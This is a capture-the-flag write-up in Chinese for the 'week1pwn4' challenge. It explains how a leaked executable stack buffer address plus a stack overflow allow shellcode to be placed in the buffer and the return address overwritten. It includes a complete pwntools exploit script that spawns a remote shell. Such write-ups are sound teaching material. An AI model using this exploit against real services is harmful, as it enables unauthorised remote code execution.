# week1pwn4

## 题目简述

服务先泄漏输入缓冲区地址，随后把用户数据读入该缓冲区且可覆盖返回地址。该区域允许执行，因此可以在缓冲区开头放置 shellcode，再把控制流返回到泄漏地址。

## 解题过程

先接收十六进制地址。栈布局为 `0x50` 字节缓冲区、8 字节保存的 `rbp`、8 字节返回地址；将 shellcode 填充到 `0x50` 字节后覆盖返回地址：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
s.recvuntil(b'ohohoh,look here: ')
shellcode_addr = int(s.recv(14), 16)
payload = asm(shellcraft.sh()).ljust(0x50, b'\x00') + b'b' * 0x8 + p64(shellcode_addr)
s.sendlineafter(b'now,do you want to say something?\n', payload)
s.interactive()
~~~

泄漏解决了 ASLR 下栈地址不固定的问题；利用成立还依赖输入所在页面可执行，复现时应先用 `checksec` 或映射权限确认该条件。

## 方法总结

- 核心方法：利用程序提供的地址泄漏确定 shellcode 位置，再用栈溢出把返回地址指向该位置。
- 识别特征：服务主动打印指针、输入缓冲区可执行、返回地址可控。
- 注意事项：地址接收长度和换行应按实际输出解析；若 NX 开启或泄漏指向不可执行页，则必须改用 ROP，不能照搬直接跳 shellcode 的方案。
